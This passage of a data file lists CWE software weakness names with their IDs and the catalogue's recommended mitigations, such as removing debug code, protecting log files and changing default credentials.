      "::PHASE:Build and Compilation Distribution:DESCRIPTION:Remove debug code before deploying the application.::"
    ],
    [
      "critical public variable without final modifier",
      "CWE-493",
      "::PHASE:Implementation:DESCRIPTION:Declare all public fields as final when possible, especially if it is used to maintain internal state of an Applet or of classes used by an Applet. If a field must be public, then perform all appropriate sanity checks before accessing the field from your code.::"
    ],
    [
      "exposure of sensitive system information to an unauthorized control sphere",
      "CWE-497",
      "::PHASE:Architecture and Design Implementation:DESCRIPTION:Production applications should never use methods that generate internal details such as stack traces and error messages unless that information is directly committed to a log that is not viewable by the end user. All error message text should be HTML entity encoded before being written to the log file to protect against potential cross-site scripting attacks against the viewer of the logs::"
    ],
    [
      "cleartext storage of sensitive information in an environment variable",
      "CWE-526",
      "::PHASE:Architecture and Design:DESCRIPTION:Encrypt information stored in the environment variable to protect it from being exposed to an unauthorized user. If encryption is not feasible or is considered too expensive for the business use of the application, then consider using a properly protected configuration file instead of an environment variable. It should be understood that unencrypted information in a config file is also not guaranteed to be protected, but it is still a better choice, because it reduces attack surface related to weaknesses such as CWE-214. In some settings, vaults might be a feasible option for safer data transfer. Users should be notified of the business choice made to not protect the sensitive information through encryption.::PHASE:Implementation:DESCRIPTION:If the environment variable is not necessary for the desired behavior, then remove it entirely, or clear it to an empty value.::"
    ],
    [
      "exposure of core dump file to an unauthorized control sphere",
      "CWE-528",
      "::PHASE:System Configuration:DESCRIPTION:Protect the core dump files from unauthorized access.::"
    ],
    [
      "exposure of access control list files to an unauthorized control sphere",
      "CWE-529",
      "::PHASE:System Configuration:DESCRIPTION:Protect access control list files.::"
    ],
    [
      "exposure of backup file to an unauthorized control sphere",
      "CWE-530",
      "::PHASE:Policy:DESCRIPTION:Recommendations include implementing a security policy within your organization that prohibits backing up web application source code in the webroot.::"
    ],
    [
      "inclusion of sensitive information in test code",
      "CWE-531",
      "::PHASE:Distribution Installation:DESCRIPTION:Remove test code before deploying the application into production.::"
    ],
    [
      "insertion of sensitive information into log file",
      "CWE-532",
      "::PHASE:Architecture and Design Implementation:DESCRIPTION:Consider seriously the sensitivity of the information written into log files. Do not write secrets into the log files.::PHASE:Distribution:DESCRIPTION:Remove debug log files before deploying the application into production.::PHASE:Operation:DESCRIPTION:Protect log files against unauthorized read/write.::PHASE:Implementation:DESCRIPTION:Adjust configurations appropriately when software is transitioned from a debug state to production.::"
    ],
    [
      "exposure of information through shell error message",
      "CWE-535",
      ""
    ],
    [
      "servlet runtime error message containing sensitive information",
      "CWE-536",
      ""
    ],
    [
      "java runtime error message containing sensitive information",
      "CWE-537",
      "::PHASE:Implementation:DESCRIPTION:Do not expose sensitive error information to the user.::"
    ],
    [
      "inclusion of sensitive information in source code",
      "CWE-540",
      "::PHASE:Architecture and Design System Configuration:DESCRIPTION:Recommendations include removing this script from the web server and moving it to a location not accessible from the Internet.::"
    ],
    [
      "inclusion of sensitive information in an include file",
      "CWE-541",
      "::PHASE:Architecture and Design:DESCRIPTION:Do not store sensitive information in include files.::PHASE:Architecture and Design System Configuration:DESCRIPTION:Protect include files from being exposed.::"
    ],
    [
      "files or directories accessible to external parties",
      "CWE-552",
      "::PHASE:Implementation System Configuration Operation:DESCRIPTION:When storing data in the cloud (e.g., S3 buckets, Azure blobs, Google Cloud Storage, etc.), use the provider's controls to disable public access.::"
    ],
    [
      "return of stack variable address",
      "CWE-562",
      "::PHASE:Testing:DESCRIPTION:Use static analysis tools to spot return of the address of a stack variable.::"
    ],
    [
      "assignment to variable without use",
      "CWE-563",
      "::PHASE:Implementation:DESCRIPTION:Remove unused variables from the code.::"
    ],
    [
      "unsynchronized access to shared data in a multithreaded context",
      "CWE-567",
      "::PHASE:Implementation:DESCRIPTION:Remove the use of static variables used between servlets. If this cannot be avoided, use synchronized access for these variables.::"
    ],
    [
      "call to thread run() instead of start()",
      "CWE-572",
      "::PHASE:Implementation:DESCRIPTION:Use the start() method instead of the run() method.::"
    ],
    [
      "assignment of a fixed address to a pointer",
      "CWE-587",
      "::PHASE:Implementation:DESCRIPTION:Never set a pointer to a fixed address.::"
    ],
    [
      "call to non-ubiquitous api",
      "CWE-589",
      "::PHASE:Implementation:DESCRIPTION:Always test your code on any platform on which it is targeted to run on.::PHASE:Testing:DESCRIPTION:Test your code on the newest and oldest platform on which it is targeted to run on.::PHASE:Testing:DESCRIPTION:Develop a system to test for API functions that are not portable.::"
    ],
    [
      "free of memory not on the heap",
      "CWE-590",
      "::PHASE:Implementation:DESCRIPTION:Only free pointers that you have called malloc on previously. This is the recommended solution. Keep track of which pointers point at the beginning of valid chunks and free them only once.::PHASE:Implementation:DESCRIPTION:Before freeing a pointer, the programmer should make sure that the pointer was previously allocated on the heap and that the memory belongs to the programmer. Freeing an unallocated pointer will cause undefined behavior in the program.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, glibc in Linux provides protection against free of invalid pointers.::PHASE:Architecture and Design:DESCRIPTION:Use a language that provides abstractions for memory allocation and deallocation.::PHASE:Testing:DESCRIPTION:Use a tool that dynamically detects memory management problems, such as valgrind.::"
    ],
    [
      "sensitive data storage in improperly locked memory",
      "CWE-591",
      "::PHASE:Architecture and Design:DESCRIPTION:Identify data that needs to be protected from swapping and choose platform-appropriate protection mechanisms.::PHASE:Implementation:DESCRIPTION:Check return values to ensure locking operations are successful.::"
    ],
    [
      "use of wrong operator in string comparison",
      "CWE-597",
      "::PHASE:Implementation:DESCRIPTION:Within Java, use .equals() to compare string values. Within JavaScript, use == to compare string values. Within PHP, use == to compare a numeric value to a string value. (PHP converts the string to a number.):EFFECTIVENESS:High::"
    ],
    [
      "use of get request method with sensitive query strings",
      "CWE-598",
      "::PHASE:Implementation:DESCRIPTION:When sensitive information is sent, use the POST method (e.g. registration form).::"
    ],
    [
      "uncaught exception in servlet",
      "CWE-600",
      "::PHASE:Implementation:DESCRIPTION:Implement Exception blocks to handle all types of Exceptions.::"
    ],
    [
      "sensitive cookie in https session without 'secure' attribute",
      "CWE-614",
      "::PHASE:Implementation:DESCRIPTION:Always set the secure attribute when the cookie should sent via HTTPS only.::"
    ],
    [
      "inclusion of sensitive information in source code comments",
      "CWE-615",
      "::PHASE:Distribution:DESCRIPTION:Remove comments which have sensitive information about the design/implementation of the application. Some of the comments may be exposed to the user and affect the security posture of the application.::"
    ],
    [
      "variable extraction error",
      "CWE-621",
      "::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Use allowlists of variable names that can be extracted.::PHASE:Implementation:DESCRIPTION:Consider refactoring your code to avoid extraction routines altogether.::PHASE:Implementation:DESCRIPTION:In PHP, call extract() with options such as EXTR_SKIP and EXTR_PREFIX_ALL; call import_request_variables() with a prefix argument. Note that these capabilities are not present in all PHP versions.::"
    ],
    [
      "null byte interaction error (poison null byte)",
      "CWE-626",
      "::PHASE:Implementation:DESCRIPTION:Remove null bytes from all incoming strings.::"
    ],
    [
      "external control of critical state data",
      "CWE-642",
      "::PHASE:Architecture and Design:DESCRIPTION:Understand all the potential locations that are accessible to attackers. For example, some programmers assume that cookies and hidden form fields cannot be modified by an attacker, or they may not consider that environment variables can be modified before a privileged program is invoked.::PHASE:Architecture and Design:STRATEGY:Attack Surface Reduction:DESCRIPTION:Store state information and sensitive data on the server side only. Ensure that the system definitively and unambiguously keeps track of its own state and user state and has rules defined for legitimate state transitions. Do not allow any application user to affect state directly in any way other than through legitimate actions leading to state transitions. If information must be stored on the client, do not do so without encryption and integrity checking, or otherwise having a mechanism on the server side to catch tampering. Use a message authentication code (MAC) algorithm, such as Hash Message Authentication Code (HMAC) [REF-529]. Apply this against the state or sensitive data that has to be exposed, which can guarantee the integrity of the data - i.e., that the data has not been modified. Ensure that a strong hash function is used (CWE-328).::PHASE:Architecture and Design:DESCRIPTION:Store state information on the server side only. Ensure that the system definitively and unambiguously keeps track of its own state and user state and has rules defined for legitimate state transitions. Do not allow any application user to affect state directly in any way other than through legitimate actions leading to state transitions.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. With a stateless protocol such as HTTP, use some frameworks can maintain the state for you. Examples include ASP.NET View State and the OWASP ESAPI Session Management feature. Be careful of language features that provide state support, since these might be provided as a convenience to the programmer and may not be considering security.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Operation Implementation:STRATEGY:Environment Hardening:DESCRIPTION:When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.::PHASE:Testing:DESCRIPTION:Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.::PHASE:Testing:DESCRIPTION:Use dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results.::PHASE:Testing:DESCRIPTION:Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.::"
    ],
    [
      "reliance on file name or extension of externally-supplied file",
      "CWE-646",
      "::PHASE:Architecture and Design:DESCRIPTION:Make decisions on the server side based on file content and not on file name or extension.::"
    ],
    [
      "incorrect use of privileged apis",
      "CWE-648",
      "::PHASE:Implementation:DESCRIPTION:Before calling privileged APIs, always ensure that the assumptions made by the privileged code hold true prior to making the call.::PHASE:Architecture and Design:DESCRIPTION:Know architecture and implementation weaknesses of the privileged APIs and make sure to account for these weaknesses before calling the privileged APIs to ensure that they can be called safely.::PHASE:Implementation:DESCRIPTION:If privileged APIs make certain assumptions about data, context or state validity that are passed by the caller, the calling code must ensure that these assumptions have been validated prior to making the call.::PHASE:Implementation:DESCRIPTION:If privileged APIs do not shed their privilege prior to returning to the calling code, then calling code needs to shed these privileges immediately and safely right after the call to the privileged APIs. In particular, the calling code needs to ensure that a privileged thread of execution will never be returned to the user or made available to user-controlled processes.::PHASE:Implementation:DESCRIPTION:Only call privileged APIs from safe, consistent and expected state.::PHASE:Implementation:DESCRIPTION:Ensure that a failure or an error will not leave a system in a state where privileges are not properly shed and privilege escalation is possible (i.e. fail securely with regards to handling of privileges).::"
    ],
    [
      "reliance on a single factor in a security decision",
      "CWE-654",
      "::PHASE:Architecture and Design:DESCRIPTION:Use multiple simultaneous checks before granting access to critical operations or granting critical privileges. A weaker but helpful mitigation is to use several successive checks (multiple layers of security).::PHASE:Architecture and Design:DESCRIPTION:Use redundant access rules on different choke points (e.g., firewalls).::"
    ],
    [
      "use of a non-reentrant function in a concurrent context",
      "CWE-663",
      "::PHASE:Implementation:DESCRIPTION:Use reentrant functions if available.::PHASE:Implementation:DESCRIPTION:Add synchronization to your non-reentrant function.::PHASE:Implementation:DESCRIPTION:In Java, use the ReentrantLock Class.::"
    ],
    [
      "lack of administrator control over security",
      "CWE-671",
      ""
    ],
    [
      "use of potentially dangerous function",
      "CWE-676",
      "::PHASE:Build and Compilation Implementation:DESCRIPTION:Identify a list of prohibited API functions and prohibit developers from using these functions, providing safer alternatives. In some cases, automatic code analysis tools or the compiler can be instructed to spot use of prohibited functions, such as the banned.h include file from Microsoft's SDL. [REF-554] [REF-7]::"
    ],
    [
      "integer overflow to buffer overflow",
      "CWE-680",
      ""
    ],
    [
      "function call with incorrect order of arguments",
      "CWE-683",
      "::PHASE:Implementation:DESCRIPTION:Use the function, procedure, or routine as specified.::PHASE:Testing:DESCRIPTION:Because this function call often produces incorrect behavior it will usually be detected during testing or normal operation of the product. During testing exercise all possible control paths will typically expose this weakness except in rare cases when the incorrect function call accidentally produces the correct results or if the provided argument type is very similar to the expected argument type.::"
    ],
    [
      "function call with incorrect number of arguments",
      "CWE-685",
      "::PHASE:Testing:DESCRIPTION:Because this function call often produces incorrect behavior it will usually be detected during testing or normal operation of the product. During testing exercise all possible control paths will typically expose this weakness except in rare cases when the incorrect function call accidentally produces the correct results or if the provided argument type is very similar to the expected argument type.::"
    ],
    [
      "function call with incorrect argument type",
      "CWE-686",
      "::PHASE:Testing:DESCRIPTION:Because this function call often produces incorrect behavior it will usually be detected during testing or normal operation of the product. During testing exercise all possible control paths will typically expose this weakness except in rare cases when the incorrect function call accidentally produces the correct results or if the provided argument type is very similar to the expected argument type.::"
    ],
    [
      "function call with incorrectly specified argument value",
      "CWE-687",
      ""
    ],
    [
      "function call with incorrect variable or reference as argument",
      "CWE-688",
      "::PHASE:Testing:DESCRIPTION:Because this function call often produces incorrect behavior it will usually be detected during testing or normal operation of the product. During testing exercise all possible control paths will typically expose this weakness except in rare cases when the incorrect function call accidentally produces the correct results or if the provided argument type is very similar to the expected argument type.::"
    ],
    [
      "unchecked return value to null pointer dereference",
      "CWE-690",
      ""
    ],
    [
      "incorrect type conversion or cast",
      "CWE-704",
      ""
    ],
    [
      "use of incorrectly-resolved name or reference",
      "CWE-706",
      ""
    ],
    [
      "exposed dangerous method or function",
      "CWE-749",
      "::PHASE:Architecture and Design:DESCRIPTION:If you must expose a method, make sure to perform input validation on all arguments, limit access to authorized parties, and protect against all possible vulnerabilities.::PHASE:Architecture and Design Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:Identify all exposed functionality. Explicitly list all functionality that must be exposed to some user or set of users. Identify which functionality may be: accessible to all users restricted to a small set of privileged users prevented from being directly accessible at all Ensure that the implemented code follows these expectations. This includes setting the appropriate access modifiers where applicable (public, private, protected, etc.) or not marking ActiveX controls safe-for-scripting.::"
    ],
    [
      "free of pointer not at start of buffer",
      "CWE-761",
      "::PHASE:Implementation:DESCRIPTION:When utilizing pointer arithmetic to traverse a buffer, use a separate variable to track progress through memory and preserve the originally allocated address for later freeing.::PHASE:Implementation:DESCRIPTION:When programming in C++, consider using smart pointers provided by the boost library to help correctly and consistently manage memory.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, glibc in Linux provides protection against free of invalid pointers.::PHASE:Architecture and Design:DESCRIPTION:Use a language that provides abstractions for memory allocation and deallocation.::PHASE:Testing:DESCRIPTION:Use a tool that dynamically detects memory management problems, such as valgrind.::"
    ],
    [
      "release of invalid pointer or reference",
      "CWE-763",
      "::PHASE:Implementation:DESCRIPTION:Only call matching memory management functions. Do not mix and match routines. For example, when you allocate a buffer with malloc(), dispose of the original pointer with free().::PHASE:Implementation:DESCRIPTION:When programming in C++, consider using smart pointers provided by the boost library to help correctly and consistently manage memory.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, glibc in Linux provides protection against free of invalid pointers.::PHASE:Architecture and Design:DESCRIPTION:Use a language that provides abstractions for memory allocation and deallocation.::PHASE:Testing:DESCRIPTION:Use a tool that dynamically detects memory management problems, such as valgrind.::"
    ],
    [
      "multiple locks of a critical resource",
      "CWE-764",
      "::PHASE:Implementation:DESCRIPTION:When locking and unlocking a resource, try to be sure that all control paths through the code in which the resource is locked one or more times correspond to exactly as many unlocks. If the software acquires a lock and then determines it is not able to perform its intended behavior, be sure to release the lock(s) before waiting for conditions to improve. Reacquire the lock(s) before trying again.::"
    ],
    [
      "critical data element declared public",
      "CWE-766",
      "::PHASE:Implementation:DESCRIPTION:Data should be private, static, and final whenever possible. This will assure that your code is protected by instantiating early, preventing access, and preventing tampering.::"
    ],
    [
      "access to critical private variable via public method",
      "CWE-767",
      "::PHASE:Implementation:DESCRIPTION:Use class accessor and mutator methods appropriately. Perform validation when accepting data from a public method that is intended to modify a critical private variable. Also be sure that appropriate access controls are being applied when a public method interfaces with critical data.::"
    ],
    [
      "missing reference to active file descriptor or handle",
      "CWE-773",
      "::PHASE:Operation Architecture and Design:STRATEGY:Resource Limitation:DESCRIPTION:Use resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems. When the current levels get close to the maximum that is defined for the application (see CWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users. Ensure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703).::"
    ],
    [
      "missing release of file descriptor or handle after effective lifetime",
      "CWE-775",
      "::PHASE:Operation Architecture and Design:STRATEGY:Resource Limitation:DESCRIPTION:Use resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems. When the current levels get close to the maximum that is defined for the application (see CWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users. Ensure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703).::"
    ],
    [
      "use of path manipulation function without maximum-sized buffer",
      "CWE-785",
      "::PHASE:Implementation:DESCRIPTION:Always specify output buffers large enough to handle the maximum-size possible result from path manipulation functions.::"
    ],
    [
      "access of memory location before start of buffer",
      "CWE-786",
      ""
    ],
    [
      "access of memory location after end of buffer",
      "CWE-788",
      ""
    ],
    [
      "memory allocation with excessive size value",
      "CWE-789",
      "::PHASE:Implementation Architecture and Design:DESCRIPTION:Perform adequate input validation against any value that influences the amount of memory that is allocated. Define an appropriate strategy for handling requests that exceed the limit, and consider supporting a configuration option so that the administrator can extend the amount of memory to be used if necessary.::PHASE:Operation:DESCRIPTION:Run your program using system-provided resource limits for memory. This might still cause the program to crash or exit, but the impact to the rest of the system will be minimized.::"
    ],
    [
      "improper control of interaction frequency",
      "CWE-799",
      ""
    ],
    [
      "buffer access using size of source buffer",
      "CWE-806",
      "::PHASE:Architecture and Design:DESCRIPTION:Use an abstraction library to abstract away risky APIs. Examples include the Safe C String Library (SafeStr) by Viega, and the Strsafe.h library from Microsoft. This is not a complete solution, since many buffer overflows are not related to strings.::PHASE:Operation Build and Compilation:STRATEGY:Environment Hardening:DESCRIPTION:Use automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking. D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail.:EFFECTIVENESS:Defense in Depth::PHASE:Implementation:DESCRIPTION:Programmers should adhere to the following rules when allocating and managing their applications memory: Double check that your buffer is as large as you specify. When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string. Check buffer boundaries if calling this function in a loop and make sure there is no danger of writing past the allocated space. Truncate all input strings to a reasonable length before passing them to the copy and concatenation functions.::PHASE:Operation Build and Compilation:STRATEGY:Environment Hardening:DESCRIPTION:Run or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code. Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as rebasing (for Windows) and prelinking (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking. For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335].:EFFECTIVENESS:Defense in Depth::PHASE:Operation:STRATEGY:Environment Hardening:DESCRIPTION:Use a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment. For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336].:EFFECTIVENESS:Defense in Depth::PHASE:Build and Compilation Operation:DESCRIPTION:Most mitigating technologies at the compiler or OS level to date address only a subset of buffer overflow problems and rarely provide complete protection against even that subset. It is good practice to implement strategies to increase the workload of an attacker, such as leaving the attacker to guess an unknown value that changes every program execution.::"
    ],
    [
      "use of out-of-range pointer offset",
      "CWE-823",
      ""
    ],
    [
      "inappropriate encoding for output context",
      "CWE-838",
      "::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:Use context-aware encoding. That is, understand which encoding is being used by the downstream component, and ensure that this encoding is used. If an encoding can be specified, do so, instead of assuming that the default encoding is the same as the default being assumed by the downstream component.::PHASE:Architecture and Design:STRATEGY:Output Encoding:DESCRIPTION:Where possible, use communications protocols or data formats that provide strict boundaries between control and data. If this is not feasible, ensure that the protocols or formats allow the communicating components to explicitly state which encoding/decoding method is being used. Some template frameworks provide built-in support.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, consider using the ESAPI Encoding control [REF-45] or a similar tool, library, or framework. These will help the programmer encode outputs in a manner less prone to error. Note that some template mechanisms provide built-in support for the appropriate encoding.::"
    ],
    [
      "use of expired file descriptor",
      "CWE-910",
      ""
    ],
    [
      "improper update of reference count",
      "CWE-911",
      ""
    ],
    [
      "use of redundant code",
      "CWE-1041",
      "::PHASE:Implementation:DESCRIPTION:Merge common functionality into a single function and then call that function from across the entire code base.::"
    ],
    [
      "creation of immutable text using string concatenation",
      "CWE-1046",
      ""
    ],
    [
      "invokable control element with large number of outward calls",
      "CWE-1048",
      ""
    ],
    [
      "excessive data query operations in a large data table",
      "CWE-1049",
      ""
    ],
    [
      "creation of class instance within a static code block",
      "CWE-1063",
      ""
    ],
    [
      "empty exception block",
      "CWE-1069",
      "::PHASE:Implementation:DESCRIPTION:For every exception block add code that handles the specific exception in the way intended by the application.::"
    ],
    [
      "empty code block",
      "CWE-1071",
      ""
    ],
    [
      "source code file with excessive number of lines of code",
      "CWE-1080",
      ""
    ],
    [
      "large data table with excessive number of indices",
      "CWE-1089",
      ""
    ],
    [
      "use of object without invoking destructor method",
      "CWE-1091",
      ""
    ],
    [
      "excessive index range scan for a data resource",
      "CWE-1094",
      ""
    ],
    [
      "reliance on runtime component in generated code",
      "CWE-1101",
      ""
    ],
    [
      "use of same variable for multiple purposes",
      "CWE-1109",
      ""
    ],
    [
      "excessive use of self-modifying code",
      "CWE-1123",
      ""
    ],
    [
      "declaration of variable with unnecessarily wide scope",
      "CWE-1126",
      ""
    ],
    [
      "use of prohibited code",
      "CWE-1177",
      ""
    ],
    [
      "failure to disable reserved bits",
      "CWE-1209",
      "::PHASE:Architecture and Design Implementation:DESCRIPTION:Include a feature to disable reserved bits.::PHASE:Integration:DESCRIPTION:Any writes to these reserve bits are blocked (e.g., ignored, access-protected, etc.), or an exception can be asserted.::"
    ],
    [
      "insufficient granularity of address regions protected by register locks",
      "CWE-1222",
      "::PHASE:Architecture and Design:DESCRIPTION:The defining of protected locked registers should be reviewed or tested early in the design phase with software teams to ensure software flows are not blocked by the security locks. As an alternative to using register lock control bits and fixed access control regions, the hardware design could use programmable security access control configuration so that device trusted firmware can configure and change the protected regions based on software usage and security models.::"
    ],
    [
      "incorrect use of autoboxing and unboxing for performance critical operations",
      "CWE-1235",
      "::PHASE:Implementation:DESCRIPTION:Use of boxed primitives should be limited to certain situations such as when calling methods with typed parameters. Examine the use of boxed primitives prior to use. Use SparseArrays or ArrayMap instead of HashMap to avoid performance overhead.::"
    ],
    [
      "exposure of sensitive system information due to uncleared debug information",
      "CWE-1258",
      "::PHASE:Architecture and Design:DESCRIPTION:Whenever debug mode is enabled, all registers containing sensitive assets must be cleared.::"
    ],
    [
      "uninitialized value on reset for registers holding security settings",
      "CWE-1271",
      "::PHASE:Implementation:DESCRIPTION:Design checks should be performed to identify any uninitialized flip-flops used for security-critical functions.::PHASE:Architecture and Design:DESCRIPTION:All registers holding security-critical information should be set to a specific value on reset.::"
    ],
    [
      "improper access control for volatile memory containing boot code",
      "CWE-1274",
      "::PHASE:Architecture and Design:DESCRIPTION:Ensure that the design of volatile-memory protections is enough to prevent modification from an adversary or untrusted code.::PHASE:Testing:DESCRIPTION:Test the volatile-memory protections to ensure they are safe from modification or untrusted code.::"
    ],
    [
      "assumed-immutable data is stored in writable memory",
      "CWE-1282",
      "::PHASE:Implementation:DESCRIPTION:All immutable code or data should be programmed into ROM or write-once memory.::"
    ],
    [
      "improper validation of specified index, position, or offset in input",
      "CWE-1285",
      "::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.:EFFECTIVENESS:High::"
    ],
    [
      "hardware allows activation of test or debug logic at runtime",
      "CWE-1313",
      "::PHASE:Architecture and Design:DESCRIPTION:Insert restrictions on when the hardware's test or debug features can be activated. For example, during normal operating modes, the hardware's privileged modes that allow access to such features cannot be activated. Configuring the hardware to only enter a test or debug mode within a window of opportunity such as during boot or configuration stage. The result is disablement of such test/debug features and associated modes during normal runtime operations.::PHASE:Implementation:DESCRIPTION:Insert restrictions on when the hardware's test or debug features can be activated. For example, during normal operating modes, the hardware's privileged modes that allow access to such features cannot be activated. Configuring the hardware to only enter a test or debug mode within a window of opportunity such as during boot or configuration stage. The result is disablement of such test/debug features and associated modes during normal runtime operations.::PHASE:Integration:DESCRIPTION:Insert restrictions on when the hardware's test or debug features can be activated. For example, during normal operating modes, the hardware's privileged modes that allow access to such features cannot be activated. Configuring the hardware to only enter a test or debug mode within a window of opportunity such as during boot or configuration stage. The result is disablement of such test/debug features and associated modes during normal runtime operations.::"
    ],
    [
      "use of blocking code in single-threaded, non-blocking context",
      "CWE-1322",
      "::PHASE:Implementation:DESCRIPTION:Generally speaking, blocking calls should be replaced with non-blocking alternatives that can be used asynchronously. Expensive computations should be passed off to worker threads, although the correct approach depends on the framework being used.::PHASE:Implementation:DESCRIPTION:For expensive computations, consider breaking them up into multiple smaller computations. Refer to the documentation of the framework being used for guidance.::"
    ],
    [
      "binding to an unrestricted ip address",
      "CWE-1327",
      "::PHASE:System Configuration:DESCRIPTION:Assign IP addresses that are not 0.0.0.0.:EFFECTIVENESS:High::PHASE:System Configuration:STRATEGY:Firewall:DESCRIPTION:Unwanted connections to the configured server may be denied through a firewall or other packet filtering measures.:EFFECTIVENESS:High::"
    ],
    [
      "security version number mutable to older versions",
      "CWE-1328",
      "::PHASE:Architecture and Design:DESCRIPTION:When architecting the system, security version data should be designated for storage in registers that are either read-only or have access controls that prevent modification by an untrusted agent.::PHASE:Implementation:DESCRIPTION:During implementation and test, security version data should be demonstrated to be read-only and access controls should be validated.::"
    ],
    [
      "insufficient precision or accuracy of a real number",
      "CWE-1339",
      "::PHASE:Implementation Patching and Maintenance:DESCRIPTION:The developer or maintainer can move to a more accurate representation of real numbers. In extreme cases, the programmer can move to representations such as ratios of BigInts which can represent real numbers to extremely fine precision. The programmer can also use the concept of an Unum real. The memory and CPU tradeoffs of this change must be examined. Since floating point reals are used in many products and many locations, they are implemented in hardware and most format changes will cause the calculations to be moved into software resulting in slower products.::"
    ],
    [
      "use of default credentials",
      "CWE-1392",
      "::PHASE:Requirements:DESCRIPTION:Prohibit use of default, hard-coded, or other values that do not vary for each installation of the product - especially for separate organizations.:EFFECTIVENESS:High::PHASE:Architecture and Design:DESCRIPTION:Force the administrator to change the credential upon installation.:EFFECTIVENESS:High::PHASE:Installation Operation:DESCRIPTION:The product administrator could change the defaults upon installation or during operation.:EFFECTIVENESS:Moderate::"
    ],
    [
      "use of default password",
      "CWE-1393",
      "::PHASE:Requirements:DESCRIPTION:Prohibit use of default, hard-coded, or other values that do not vary for each installation of the product - especially for separate organizations.:EFFECTIVENESS:High::PHASE:Documentation:DESCRIPTION:Ensure that product documentation clearly emphasizes the presence of default passwords and provides steps for the administrator to change them.:EFFECTIVENESS:Limited::PHASE:Architecture and Design:DESCRIPTION:Force the administrator to change the credential upon installation.:EFFECTIVENESS:High::PHASE:Installation Operation:DESCRIPTION:The product administrator could change the defaults upon installation or during operation.:EFFECTIVENESS:Moderate::"
    ],
    [
      "use of default cryptographic key",
      "CWE-1394",
      "::PHASE:Requirements:DESCRIPTION:Prohibit use of default, hard-coded, or other values that do not vary for each installation of the product - especially for separate organizations.:EFFECTIVENESS:High::PHASE:Architecture and Design:DESCRIPTION:Force the administrator to change the credential upon installation.:EFFECTIVENESS:High::PHASE:Installation Operation:DESCRIPTION:The product administrator could change the defaults upon installation or during operation.:EFFECTIVENESS:Moderate::"
    ],
    [
      "reliance on http instead of https",
      "CWE-1428",
